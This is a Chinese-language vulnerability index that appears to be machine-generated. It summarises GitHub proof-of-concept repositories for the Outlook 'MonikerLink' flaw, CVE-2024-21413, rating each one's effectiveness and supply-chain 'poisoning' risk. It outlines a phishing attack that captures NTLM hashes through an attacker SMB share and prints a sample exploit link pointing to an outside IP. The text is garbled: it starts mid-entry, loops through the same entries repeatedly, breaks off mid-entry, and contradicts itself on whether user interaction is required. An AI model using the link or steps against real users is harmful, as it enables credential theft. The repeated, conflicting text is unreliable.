**项目地址:** [Cyber-Trambon/CVE-2024-21413-exploit](https://github.com/Cyber-Trambon/CVE-2024-21413-exploit)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #4

**来源**: [CVE-2024-21413-D1se0_CVE-2024-21413-Vulnerabilidad-Outlook-LAB.md](../2024/CVE-2024-21413-D1se0_CVE-2024-21413-Vulnerabilidad-Outlook-LAB.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致信息泄露、远程代码执行和权限提升

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本 < 16.0.5435.1001)、Microsoft Office 2019、Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021（所有受支持版本，直至2024年2月更新）。

**利用条件:** 需要受害者使用 Microsoft Outlook 打开包含特制 file:// 链接的邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一种 Microsoft Outlook 远程代码执行漏洞，也称为 “MonikerLink” 漏洞。攻击者可以利用此漏洞通过发送包含恶意 `file://` 链接的电子邮件来远程执行代码。当用户点击该链接时，Outlook 会尝试连接到攻击者控制的 SMB 共享，这可能导致 NTLM 凭据泄露或未经授权访问本地文件。

**有效性：**
根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞利用的有效性较高。CISA已将此漏洞添加到已知被利用的漏洞目录(KEV)中，表明该漏洞在野外已被积极利用。PoC代码提供了一种利用 `file://` 协议将受害者重定向到攻击者控制的 SMB 共享的方案，进一步验证了该漏洞的有效性。

**投毒风险：**
PoC代码主要包含利用脚本(exploitSendEmailOutlook.py, captureHashResponder.py)和辅助配置文件。`exploitSendEmailOutlook.py` 脚本用于发送包含恶意链接的电子邮件，`captureHashResponder.py` 用于启动 Responder 工具以捕获 NTLM 哈希。startServicesWindows.py用于快速启动漏洞验证环境.投毒风险主要存在于以下几个方面：

1.  **隐蔽的反向 Shell：** 攻击者可能在 `exploitSendEmailOutlook.py` 脚本中添加反向 Shell 代码，在受害者点击恶意链接时，在后台静默执行，从而控制受害者系统。
2.  **恶意 Responder 配置：** 攻击者可能修改 `captureHashResponder.py` 脚本，使其在捕获 NTLM 哈希的同时，执行其他恶意操作，例如下载并执行恶意文件。
3.  **供应链投毒：** 该 PoC 依赖于多个 Python 库（如 `pyautogui`、`Pillow`、`opencv-python` 和 `rich`）。攻击者可能通过篡改这些依赖库，植入恶意代码，从而影响所有使用该 PoC 的用户。

综合考虑，虽然 PoC 代码主要功能是演示漏洞利用，但存在潜在的投毒风险。攻击者可能利用代码中的可扩展性，添加恶意功能，或者通过篡改依赖库进行供应链投毒。因此，在使用该 PoC 时，务必进行代码审计，并从可信的源获取依赖库。

**利用方式：**
利用方式如下：

1.  **发送恶意邮件：** 攻击者构造一封包含恶意 `file://` 链接的电子邮件，并将其发送给受害者。
2.  **诱导点击链接：** 攻击者通过各种手段诱使受害者点击邮件中的恶意链接。
3.  **NTLM 凭据捕获/文件访问：** 受害者点击链接后，Outlook 会尝试连接到攻击者控制的 SMB 共享。Responder 工具会捕获受害者的 NTLMv2 哈希。或者，攻击者可以直接访问受害者本地文件（如果链接指向本地文件）。
4.  **代码执行 (可选)：** 攻击者可以进一步利用捕获的 NTLM 哈希进行密码破解，或者利用文件访问权限在受害者系统上执行恶意代码。

总而言之，CVE-2024-21413 是一个高危漏洞，利用方式简单，容易被攻击者利用。在使用该漏洞验证 PoC 时，必须在隔离环境中进行，并仔细审查代码，以防止被投毒。

**项目地址:** [D1se0/CVE-2024-21413-Vulnerabilidad-Outlook-LAB](https://github.com/D1se0/CVE-2024-21413-Vulnerabilidad-Outlook-LAB)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #5

**来源**: [CVE-2024-21413-DerZiad_CVE-2024-21413.md](../2024/CVE-2024-21413-DerZiad_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码

**影响版本:** 受影响版本包括Microsoft Office 2016、2019、LTSC 2021和Microsoft 365 Apps for Enterprise的特定版本

**利用条件:** 攻击者需要诱使用户打开恶意构造的电子邮件或者访问恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，无需用户交互即可触发。 根据搜索结果，该漏洞也被称为"MonikerLink" bug。漏洞利用方式通常涉及构造特殊的电子邮件，诱使用户打开或预览，从而在用户系统上执行任意代码。提供的漏洞利用代码仅仅是Apache License 2.0，不包含任何可执行代码，因此无法评估漏洞利用的有效性。但是，根据CVE信息和搜索结果，该漏洞的利用已经存在，并被CISA列入已知被利用漏洞目录。由于提供的代码只是许可证，因此不存在投毒风险。

**项目地址:** [DerZiad/CVE-2024-21413](https://github.com/DerZiad/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #6

**来源**: [CVE-2024-21413-MQKGitHub_Moniker-Link-CVE-2024-21413.md](../2024/CVE-2024-21413-MQKGitHub_Moniker-Link-CVE-2024-21413.md)

## CVE-2024-21413 - Microsoft Outlook Remote Code Execution Vulnerability

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE) / NTLM Hash Leak

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行、NTLM凭据泄露、横向移动和权限提升

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021

**利用条件:** 用户需要点击恶意链接，攻击者可以通过构造恶意链接在电子邮件或其他Office文档中触发漏洞。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个关键安全漏洞，被称为“MonikerLink”。该漏洞允许攻击者绕过 Outlook 的内置保护机制，例如受保护视图，并利用 Moniker Link 泄露 NTLM 凭据，甚至可能执行远程代码。根据漏洞信息和搜索结果，该漏洞涉及对特定超链接处理不当的问题。攻击者可以通过在文件中构造恶意链接来利用此漏洞。

**利用方式：**

1.  **构造恶意链接：** 攻击者创建一个包含恶意 Moniker Link 的电子邮件或其他 Office 文档。该链接旨在利用 `MkParseDisplayName()` API 的行为。
2.  **绕过保护：** 通过在 `file://` URL 中使用 `!exploit` 等技巧绕过 Outlook 的 Protected View。
3.  **触发 SMB 身份验证：** 恶意链接指向攻击者控制的 SMB 服务器，从而触发受害者的 Outlook 尝试进行 SMB 身份验证。
4.  **捕获 NTLM 哈希：** 攻击者使用 Responder 等工具监听 SMB 身份验证请求，并捕获受害者的 NTLMv2 哈希。
5.  **潜在的 RCE：** 虽然目前没有公开可用的 RCE PoC，但该漏洞具有远程代码执行的潜力。

**有效性评估：**
提供的漏洞利用代码是一个关于如何利用 CVE-2024-21413 漏洞的说明文档和示例。它展示了使用 Python (smtplib) 发送包含恶意 Moniker Link 的电子邮件，并使用 Responder 捕获 NTLM 哈希的过程。根据 TryHackMe 挑战的完成状态，提供的 PoC 是有效的，可以成功利用该漏洞泄露 NTLM 哈希。

**投毒风险评估：**
该仓库主要是一个漏洞利用教程和概念验证，并没有明显的恶意代码。但仍然存在一定的投毒风险，主要体现在以下几个方面：

*   **潜在的细微修改：** 攻击者可能会在示例脚本中引入细微的修改，例如更改 SMB 服务器的 IP 地址或添加额外的恶意功能。尽管可能性不高，但仍然需要保持警惕。
*   **依赖的工具：** 该漏洞利用依赖于 Responder 等工具。如果攻击者修改了这些工具，可能会导致意外的行为或安全问题。

因此，综合评估投毒风险较低，但不能完全排除，可能性大约为10%。


**项目地址:** [MQKGitHub/Moniker-Link-CVE-2024-21413](https://github.com/MQKGitHub/Moniker-Link-CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #7

**来源**: [CVE-2024-21413-MSeymenD_CVE-2024-21413.md](../2024/CVE-2024-21413-MSeymenD_CVE-2024-21413.md)

# CVE-2024-21413

> 📦 该CVE有 **23** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-21413-ArtemCyberLab_Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413.md](../2024/CVE-2024-21413-ArtemCyberLab_Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413.md)

## CVE-2024-21413 Microsoft Outlook Remote Code Execution Vulnerability

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行和系统被完全控制

**影响版本:** Office 2016版本小于 16.0.5435.1001，Office 2019、Microsoft 365 Apps for Enterprise、Office LTSC 2021 版本小于 https://aka.ms/OfficeSecurityReleases 指示的版本

**利用条件:** 受害者需要点击攻击者发送的包含恶意链接的邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 'MonikerLink' 漏洞。攻击者可以通过发送包含特制 `file://` URL 的电子邮件来利用此漏洞，当用户点击该链接时，Outlook 会尝试访问该 URL 指向的文件，如果该 URL 指向攻击者控制的服务器，攻击者可以捕获 NTLM 哈希或触发其他恶意行为，甚至实现远程代码执行。

**漏洞利用有效性：**
根据提供的漏洞利用代码，该 POC 利用了 `file://` 协议处理不当的问题。POC 包含两个部分：使用 Responder 捕获 NTLM 哈希和使用 Python 脚本发送包含恶意 `file://` 链接的电子邮件。该方法利用了 Outlook 对 `file://` 协议的处理缺陷，在无需用户交互的情况下触发漏洞，因此判断POC具有有效性。

**投毒风险：**
该漏洞利用代码主要包含一个 Python 脚本，用于发送包含恶意链接的电子邮件。虽然脚本本身的功能是发送电子邮件，但其中包含的恶意链接可能导致受害者系统遭受攻击。Responder 工具用于捕获网络中的 NTLM 哈希，本身属于安全工具，但也被攻击者用于非法目的。该漏洞利用代码的主要风险在于利用邮件进行社工欺骗，诱导用户点击恶意链接。攻击者可以替换链接指向的恶意文件，执行任意命令，或者植入后门。该 POC 存在一定的投毒风险，评估为10%。

**利用方式：**
1.  攻击者使用 Responder 等工具监听网络，准备捕获 NTLM 哈希。
2.  攻击者构造包含恶意 `file://` 链接的电子邮件。链接指向攻击者控制的服务器或共享目录。
3.  攻击者将电子邮件发送给受害者。
4.  受害者打开电子邮件并点击恶意链接。
5.  Outlook 尝试访问该链接，导致 NTLM 认证信息泄露或触发其他恶意行为。
6. 攻击者可以利用捕获的 NTLM 哈希进行进一步的攻击，例如破解哈希或利用 Pass-the-Hash 技术。

**项目地址:** [ArtemCyberLab/Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413](https://github.com/ArtemCyberLab/Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #2

**来源**: [CVE-2024-21413-CMNatic_CVE-2024-21413.md](../2024/CVE-2024-21413-CMNatic_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在受害者机器上执行任意代码

**影响版本:** 受影响版本包括Microsoft Office 2016 (版本 < 16.0.5435.1001)，Microsoft Office 2019，Microsoft 365 Apps for Enterprise，Microsoft Office LTSC 2021，具体版本范围参考漏洞库信息

**利用条件:** 无需用户交互即可触发

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 "MonikerLink" 漏洞。漏洞位于Outlook处理moniker链接的方式上，未经身份验证的远程攻击者可以通过发送特制的电子邮件来利用此漏洞，从而在受害者的系统上执行任意代码，而无需用户交互。根据搜索引擎结果，此漏洞利用的复杂度较低，危害性极高。漏洞库信息显示 CVSS 评分为 9.8，属于危急漏洞。CISA 已将其添加到已知被利用漏洞目录（KEV）。

提供的漏洞利用代码只是一个Apache License 2.0的LICENSE文件,本身不包含任何漏洞利用代码，但根据搜索引擎结果中的 "github.com/ThemeHackers/CVE-2024-21413" 链接，推测存在公开可用的漏洞利用代码。 由于提供的代码仅仅是一个LICENSE文件，所以可以判定投毒风险为0%。

**利用方式：** 攻击者构造包含恶意 moniker 链接的电子邮件，当 Outlook 客户端解析该邮件时，会触发漏洞并执行攻击者预设的恶意代码，最终导致远程代码执行。

**项目地址:** [CMNatic/CVE-2024-21413](https://github.com/CMNatic/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #3

**来源**: [CVE-2024-21413-Cyber-Trambon_CVE-2024-21413-exploit.md](../2024/CVE-2024-21413-Cyber-Trambon_CVE-2024-21413-exploit.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，可能导致信息泄露、NTLM凭据窃取和远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office LTSC 2021、Microsoft 365 Apps for Enterprise、Microsoft Outlook 2016 和 Microsoft Office 2019。具体受影响版本请参考漏洞库信息。

**利用条件:** 攻击者需要能够通过电子邮件向目标用户发送特制邮件。

**POC 可用性:** 是

**投毒风险:** 30%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中存在的一个远程代码执行漏洞，也称为 "MonikerLink" 漏洞。攻击者可以通过在电子邮件中嵌入特制的 `file://` 链接，绕过 Protected View 并执行恶意代码。 

**有效性：**
根据漏洞库信息和搜索结果，该漏洞被标记为严重，且存在在野利用。提供的 POC 代码利用了 `file://` 协议处理中的缺陷，通过构造恶意链接（例如 `file:///\\10.10.111.111\test\test.rtf!exploit`）来触发漏洞。POC 代码中给出了使用示例，表明该漏洞利用方式是有效的。

**投毒风险：**
POC 代码本身看起来是直接的，旨在利用该漏洞进行远程代码执行或者泄露NTLM凭据。但是，**存在以下几点需要注意**：
1.  **短链接风险**: POC 使用短链接 `https://shorturl.at/7itzw` 下载代码，这本身就是一个潜在的风险点。虽然当前链接可能指向合法的代码仓库，但攻击者可以随时更改短链接的目标地址，从而传播恶意软件。
2.  **Payload 可定制性**：该 POC 允许用户自定义 payload，这为潜在的恶意利用敞开了大门。用户可以将 payload 设置为下载和执行恶意代码，从而实现远程控制等目的。
3.  **隐蔽的后门植入**: 由于代码可以被修改,有可能被植入后门。

考虑到短链接带来的不确定性，Payload的可定制性，以及后门植入的可能性，存在30%的投毒风险。

**利用方式：**
1.  **构造恶意邮件：** 攻击者创建一个包含特制 `file://` 链接的电子邮件。
2.  **发送邮件：** 将该邮件发送给目标用户。
3.  **触发漏洞：** 当用户打开邮件时，Outlook 尝试解析 `file://` 链接。如果链接构造不当（例如包含 `!exploit`），则可能触发漏洞，导致执行恶意代码或泄露 NTLM 凭据。
4.  **远程代码执行或凭据窃取：** 如果成功利用该漏洞，攻击者可以执行任意代码或窃取用户的 NTLM 凭据，从而进一步控制受害者的系统。

综上所述，CVE-2024-21413 是一个严重的漏洞，利用方式相对简单，且存在有效的 POC 代码。企业应尽快应用 Microsoft 提供的补丁，以防止攻击者利用该漏洞进行攻击。

**项目地址:** [Cyber-Trambon/CVE-2024-21413-exploit](https://github.com/Cyber-Trambon/CVE-2024-21413-exploit)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #4

**来源**: [CVE-2024-21413-D1se0_CVE-2024-21413-Vulnerabilidad-Outlook-LAB.md](../2024/CVE-2024-21413-D1se0_CVE-2024-21413-Vulnerabilidad-Outlook-LAB.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致信息泄露、远程代码执行和权限提升

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本 < 16.0.5435.1001)、Microsoft Office 2019、Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021（所有受支持版本，直至2024年2月更新）。

**利用条件:** 需要受害者使用 Microsoft Outlook 打开包含特制 file:// 链接的邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一种 Microsoft Outlook 远程代码执行漏洞，也称为 “MonikerLink” 漏洞。攻击者可以利用此漏洞通过发送包含恶意 `file://` 链接的电子邮件来远程执行代码。当用户点击该链接时，Outlook 会尝试连接到攻击者控制的 SMB 共享，这可能导致 NTLM 凭据泄露或未经授权访问本地文件。

**有效性：**
根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞利用的有效性较高。CISA已将此漏洞添加到已知被利用的漏洞目录(KEV)中，表明该漏洞在野外已被积极利用。PoC代码提供了一种利用 `file://` 协议将受害者重定向到攻击者控制的 SMB 共享的方案，进一步验证了该漏洞的有效性。

**投毒风险：**
PoC代码主要包含利用脚本(exploitSendEmailOutlook.py, captureHashResponder.py)和辅助配置文件。`exploitSendEmailOutlook.py` 脚本用于发送包含恶意链接的电子邮件，`captureHashResponder.py` 用于启动 Responder 工具以捕获 NTLM 哈希。startServicesWindows.py用于快速启动漏洞验证环境.投毒风险主要存在于以下几个方面：

1.  **隐蔽的反向 Shell：** 攻击者可能在 `exploitSendEmailOutlook.py` 脚本中添加反向 Shell 代码，在受害者点击恶意链接时，在后台静默执行，从而控制受害者系统。
2.  **恶意 Responder 配置：** 攻击者可能修改 `captureHashResponder.py` 脚本，使其在捕获 NTLM 哈希的同时，执行其他恶意操作，例如下载并执行恶意文件。
3.  **供应链投毒：** 该 PoC 依赖于多个 Python 库（如 `pyautogui`、`Pillow`、`opencv-python` 和 `rich`）。攻击者可能通过篡改这些依赖库，植入恶意代码，从而影响所有使用该 PoC 的用户。

综合考虑，虽然 PoC 代码主要功能是演示漏洞利用，但存在潜在的投毒风险。攻击者可能利用代码中的可扩展性，添加恶意功能，或者通过篡改依赖库进行供应链投毒。因此，在使用该 PoC 时，务必进行代码审计，并从可信的源获取依赖库。

**利用方式：**
利用方式如下：

1.  **发送恶意邮件：** 攻击者构造一封包含恶意 `file://` 链接的电子邮件，并将其发送给受害者。
2.  **诱导点击链接：** 攻击者通过各种手段诱使受害者点击邮件中的恶意链接。
3.  **NTLM 凭据捕获/文件访问：** 受害者点击链接后，Outlook 会尝试连接到攻击者控制的 SMB 共享。Responder 工具会捕获受害者的 NTLMv2 哈希。或者，攻击者可以直接访问受害者本地文件（如果链接指向本地文件）。
4.  **代码执行 (可选)：** 攻击者可以进一步利用捕获的 NTLM 哈希进行密码破解，或者利用文件访问权限在受害者系统上执行恶意代码。

总而言之，CVE-2024-21413 是一个高危漏洞，利用方式简单，容易被攻击者利用。在使用该漏洞验证 PoC 时，必须在隔离环境中进行，并仔细审查代码，以防止被投毒。

**项目地址:** [D1se0/CVE-2024-21413-Vulnerabilidad-Outlook-LAB](https://github.com/D1se0/CVE-2024-21413-Vulnerabilidad-Outlook-LAB)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #5

**来源**: [CVE-2024-21413-DerZiad_CVE-2024-21413.md](../2024/CVE-2024-21413-DerZiad_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码

**影响版本:** 受影响版本包括Microsoft Office 2016、2019、LTSC 2021和Microsoft 365 Apps for Enterprise的特定版本

**利用条件:** 攻击者需要诱使用户打开恶意构造的电子邮件或者访问恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，无需用户交互即可触发。 根据搜索结果，该漏洞也被称为"MonikerLink" bug。漏洞利用方式通常涉及构造特殊的电子邮件，诱使用户打开或预览，从而在用户系统上执行任意代码。提供的漏洞利用代码仅仅是Apache License 2.0，不包含任何可执行代码，因此无法评估漏洞利用的有效性。但是，根据CVE信息和搜索结果，该漏洞的利用已经存在，并被CISA列入已知被利用漏洞目录。由于提供的代码只是许可证，因此不存在投毒风险。

**项目地址:** [DerZiad/CVE-2024-21413](https://github.com/DerZiad/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #6

**来源**: [CVE-2024-21413-MQKGitHub_Moniker-Link-CVE-2024-21413.md](../2024/CVE-2024-21413-MQKGitHub_Moniker-Link-CVE-2024-21413.md)

## CVE-2024-21413 - Microsoft Outlook Remote Code Execution Vulnerability

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE) / NTLM Hash Leak

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行、NTLM凭据泄露、横向移动和权限提升

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021

**利用条件:** 用户需要点击恶意链接，攻击者可以通过构造恶意链接在电子邮件或其他Office文档中触发漏洞。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个关键安全漏洞，被称为“MonikerLink”。该漏洞允许攻击者绕过 Outlook 的内置保护机制，例如受保护视图，并利用 Moniker Link 泄露 NTLM 凭据，甚至可能执行远程代码。根据漏洞信息和搜索结果，该漏洞涉及对特定超链接处理不当的问题。攻击者可以通过在文件中构造恶意链接来利用此漏洞。

**利用方式：**

1.  **构造恶意链接：** 攻击者创建一个包含恶意 Moniker Link 的电子邮件或其他 Office 文档。该链接旨在利用 `MkParseDisplayName()` API 的行为。
2.  **绕过保护：** 通过在 `file://` URL 中使用 `!exploit` 等技巧绕过 Outlook 的 Protected View。
3.  **触发 SMB 身份验证：** 恶意链接指向攻击者控制的 SMB 服务器，从而触发受害者的 Outlook 尝试进行 SMB 身份验证。
4.  **捕获 NTLM 哈希：** 攻击者使用 Responder 等工具监听 SMB 身份验证请求，并捕获受害者的 NTLMv2 哈希。
5.  **潜在的 RCE：** 虽然目前没有公开可用的 RCE PoC，但该漏洞具有远程代码执行的潜力。

**有效性评估：**
提供的漏洞利用代码是一个关于如何利用 CVE-2024-21413 漏洞的说明文档和示例。它展示了使用 Python (smtplib) 发送包含恶意 Moniker Link 的电子邮件，并使用 Responder 捕获 NTLM 哈希的过程。根据 TryHackMe 挑战的完成状态，提供的 PoC 是有效的，可以成功利用该漏洞泄露 NTLM 哈希。

**投毒风险评估：**
该仓库主要是一个漏洞利用教程和概念验证，并没有明显的恶意代码。但仍然存在一定的投毒风险，主要体现在以下几个方面：

*   **潜在的细微修改：** 攻击者可能会在示例脚本中引入细微的修改，例如更改 SMB 服务器的 IP 地址或添加额外的恶意功能。尽管可能性不高，但仍然需要保持警惕。
*   **依赖的工具：** 该漏洞利用依赖于 Responder 等工具。如果攻击者修改了这些工具，可能会导致意外的行为或安全问题。

因此，综合评估投毒风险较低，但不能完全排除，可能性大约为10%。


**项目地址:** [MQKGitHub/Moniker-Link-CVE-2024-21413](https://github.com/MQKGitHub/Moniker-Link-CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #7

**来源**: [CVE-2024-21413-MSeymenD_CVE-2024-21413.md](../2024/CVE-2024-21413-MSeymenD_CVE-2024-21413.md)

# CVE-2024-21413

> 📦 该CVE有 **23** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-21413-ArtemCyberLab_Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413.md](../2024/CVE-2024-21413-ArtemCyberLab_Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413.md)

## CVE-2024-21413 Microsoft Outlook Remote Code Execution Vulnerability

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行和系统被完全控制

**影响版本:** Office 2016版本小于 16.0.5435.1001，Office 2019、Microsoft 365 Apps for Enterprise、Office LTSC 2021 版本小于 https://aka.ms/OfficeSecurityReleases 指示的版本

**利用条件:** 受害者需要点击攻击者发送的包含恶意链接的邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 'MonikerLink' 漏洞。攻击者可以通过发送包含特制 `file://` URL 的电子邮件来利用此漏洞，当用户点击该链接时，Outlook 会尝试访问该 URL 指向的文件，如果该 URL 指向攻击者控制的服务器，攻击者可以捕获 NTLM 哈希或触发其他恶意行为，甚至实现远程代码执行。

**漏洞利用有效性：**
根据提供的漏洞利用代码，该 POC 利用了 `file://` 协议处理不当的问题。POC 包含两个部分：使用 Responder 捕获 NTLM 哈希和使用 Python 脚本发送包含恶意 `file://` 链接的电子邮件。该方法利用了 Outlook 对 `file://` 协议的处理缺陷，在无需用户交互的情况下触发漏洞，因此判断POC具有有效性。

**投毒风险：**
该漏洞利用代码主要包含一个 Python 脚本，用于发送包含恶意链接的电子邮件。虽然脚本本身的功能是发送电子邮件，但其中包含的恶意链接可能导致受害者系统遭受攻击。Responder 工具用于捕获网络中的 NTLM 哈希，本身属于安全工具，但也被攻击者用于非法目的。该漏洞利用代码的主要风险在于利用邮件进行社工欺骗，诱导用户点击恶意链接。攻击者可以替换链接指向的恶意文件，执行任意命令，或者植入后门。该 POC 存在一定的投毒风险，评估为10%。

**利用方式：**
1.  攻击者使用 Responder 等工具监听网络，准备捕获 NTLM 哈希。
2.  攻击者构造包含恶意 `file://` 链接的电子邮件。链接指向攻击者控制的服务器或共享目录。
3.  攻击者将电子邮件发送给受害者。
4.  受害者打开电子邮件并点击恶意链接。
5.  Outlook 尝试访问该链接，导致 NTLM 认证信息泄露或触发其他恶意行为。
6. 攻击者可以利用捕获的 NTLM 哈希进行进一步的攻击，例如破解哈希或利用 Pass-the-Hash 技术。

**项目地址:** [ArtemCyberLab/Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413](https://github.com/ArtemCyberLab/Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #2

**来源**: [CVE-2024-21413-CMNatic_CVE-2024-21413.md](../2024/CVE-2024-21413-CMNatic_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在受害者机器上执行任意代码

**影响版本:** 受影响版本包括Microsoft Office 2016 (版本 < 16.0.5435.1001)，Microsoft Office 2019，Microsoft 365 Apps for Enterprise，Microsoft Office LTSC 2021，具体版本范围参考漏洞库信息

**利用条件:** 无需用户交互即可触发

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 "MonikerLink" 漏洞。漏洞位于Outlook处理moniker链接的方式上，未经身份验证的远程攻击者可以通过发送特制的电子邮件来利用此漏洞，从而在受害者的系统上执行任意代码，而无需用户交互。根据搜索引擎结果，此漏洞利用的复杂度较低，危害性极高。漏洞库信息显示 CVSS 评分为 9.8，属于危急漏洞。CISA 已将其添加到已知被利用漏洞目录（KEV）。

提供的漏洞利用代码只是一个Apache License 2.0的LICENSE文件,本身不包含任何漏洞利用代码，但根据搜索引擎结果中的 "github.com/ThemeHackers/CVE-2024-21413" 链接，推测存在公开可用的漏洞利用代码。 由于提供的代码仅仅是一个LICENSE文件，所以可以判定投毒风险为0%。

**利用方式：** 攻击者构造包含恶意 moniker 链接的电子邮件，当 Outlook 客户端解析该邮件时，会触发漏洞并执行攻击者预设的恶意代码，最终导致远程代码执行。

**项目地址:** [CMNatic/CVE-2024-21413](https://github.com/CMNatic/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #3

**来源**: [CVE-2024-21413-Cyber-Trambon_CVE-2024-21413-exploit.md](../2024/CVE-2024-21413-Cyber-Trambon_CVE-2024-21413-exploit.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，可能导致信息泄露、NTLM凭据窃取和远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office LTSC 2021、Microsoft 365 Apps for Enterprise、Microsoft Outlook 2016 和 Microsoft Office 2019。具体受影响版本请参考漏洞库信息。

**利用条件:** 攻击者需要能够通过电子邮件向目标用户发送特制邮件。

**POC 可用性:** 是

**投毒风险:** 30%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中存在的一个远程代码执行漏洞，也称为 "MonikerLink" 漏洞。攻击者可以通过在电子邮件中嵌入特制的 `file://` 链接，绕过 Protected View 并执行恶意代码。 

**有效性：**
